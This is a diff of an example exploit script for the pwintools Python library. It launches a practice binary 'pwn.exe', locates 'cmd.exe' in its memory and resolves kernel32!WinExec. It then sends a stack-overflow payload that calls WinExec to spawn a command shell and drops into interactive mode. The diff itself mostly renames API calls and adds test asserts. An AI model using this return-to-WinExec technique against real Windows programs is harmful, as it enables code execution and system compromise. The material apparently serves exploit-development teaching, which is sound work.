@@ -3,29 +3,35 @@ import os.path
 sys.path.append(os.path.abspath(__file__ + "\..\.."))
 from pwintools import *
 
-
 # Run pwn.exe
 proc = Process("pwn.exe")
-print(proc)
+log.info(proc)
 
 # Search in memory cmd.exe
-cmd_exe = proc.search_memory("cmd.exe\0")
+cmd_exe = proc.search("cmd.exe\0")
 if cmd_exe:
-    print("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))
+    log.info("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))
 
 # Get WinExec address
-WinExecImport = proc.get_import('kernel32.dll', 'WinExec')
-print("WinExecImport : 0x{:x}".format(WinExecImport))
+WinExec = proc.get_proc_address('kernel32.dll', 'WinExec')   # Faster than proc.symbols['kernel32.dll']['WinExec']
 
-WinExec = u32(proc.leak(WinExecImport, 4))
-k32WinExec = proc.get_remote_func_addr('kernel32.dll', 'WinExec')
-print("WinExec imported 0x{:x} : kernel32!WinExec 0x{:x}".format(WinExec, k32WinExec))
+log.info("kernel32!WinExec @ 0x{:x}".format(WinExec))
 
-print(proc.recvline())
-print(proc.recvline())
+# Tests
+if None:
+    log.log_level = 'debug'
+    assert(proc.get_import('kernel32.dll', 'WinExec') == proc.imports['kernel32.dll']['WinExec'].addr)
+    assert(proc.symbols['kernel32.dll']['WinExec'] == proc.imports['kernel32.dll']['WinExec'].value)
+    assert(proc.symbols['kernel32.dll']['WinExec'] == proc.get_proc_address('kernel32.dll', 'WinExec'))
+    assert(proc.symbols['kernel32.dll']['WinExec'] == u32(proc.leak(proc.imports['kernel32.dll']['WinExec'].addr, 4)))
+    log.debug(proc.libs)
+    log.debug(proc.imports)
+
+log.debug(proc.recvline())
+log.debug(proc.recvline())
 
 # You can also Debug it in Python see PythonForWindows documentation
-# proc.spawndebugger(False)
+# proc.spawn_debugger(False)
 # Dirty crash incoming for pwn.exe :D
 proc.send('A' * 0x80 + p32(WinExec) + p32(0x42424242) + p32(cmd_exe) + 'A' * 4)
 proc.interactive()
